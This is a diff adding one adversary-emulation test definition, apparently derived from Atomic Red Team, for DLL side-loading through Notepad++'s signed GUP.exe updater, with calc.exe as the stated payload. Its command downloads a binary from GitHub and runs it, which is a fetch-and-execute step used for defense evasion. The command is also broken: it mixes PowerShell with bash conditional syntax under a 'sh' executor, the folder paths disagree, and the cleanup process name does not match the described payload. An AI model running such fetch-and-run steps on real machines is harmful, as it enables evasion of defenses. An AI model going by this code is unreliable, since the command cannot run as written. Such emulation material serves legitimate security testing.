@@ -1,0 +1,57 @@
+- id: 65526037-7079-44a9-bda1-2cb624838040
+  name: DLL Side-Loading using the Notepad++ GUP.exe binary
+  description: 'GUP is an open source signed binary used by Notepad++ for software
+    updates, and is vulnerable to DLL Side-Loading, thus enabling the libcurl dll
+    to be loaded.
+
+    Upon execution, calc.exe will be opened.'
+  tactic: defense-evasion
+  technique:
+    attack_id: T1574.001
+    name: 'Hijack Execution Flow: DLL'
+  platforms:
+    windows:
+      sh:
+        command: 'if (Test-Path "PathToAtomicsFolder\T1574.002\bin\GUP.exe") {exit
+          0} else {exit 1}; then : ; else New-Item -Type Directory (split-path "PathToAtomicsFolder\T1574.002\bin\GUP.exe")
+          -ErrorAction ignore | Out-Null; Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1574.001/bin/GUP.exe?raw=true"
+          -OutFile "PathToAtomicsFolder\T1574.002\bin\GUP.exe"; fi; "PathToAtomicsFolder\T1574.002\bin\GUP.exe"'
+        cleanup: 'taskkill /F /IM #{process_name} >nul 2>&1'
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - t1574.001
+  - atomic-red-team
+  - defense-evasion
+  author: Atomic Red Team
+  additional_info:
+    input_arguments:
+      process_name:
+        description: Name of the created process
+        type: string
+        default: calculator.exe
+      gup_executable:
+        description: GUP is an open source signed binary used by Notepad++ for software
+          updates
+        type: path
+        default: PathToAtomicsFolder\T1574.002\bin\GUP.exe
+    dependencies:
+    - description: 'Gup.exe binary must exist on disk at specified location (#{gup_executable})
+
+        '
+      prereq_command: 'if (Test-Path "#{gup_executable}") {exit 0} else {exit 1}
+
+        '
+      get_prereq_command: 'New-Item -Type Directory (split-path "#{gup_executable}")
+        -ErrorAction ignore | Out-Null
+
+        Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1574.001/bin/GUP.exe?raw=true"
+        -OutFile "#{gup_executable}"
+
+        '
+    technique_created: '2020-03-13T18:11:08.357Z'
+    atomic_guid: 65526037-7079-44a9-bda1-2cb624838040
+    import_timestamp: '2025-06-24T11:15:00.053161Z'
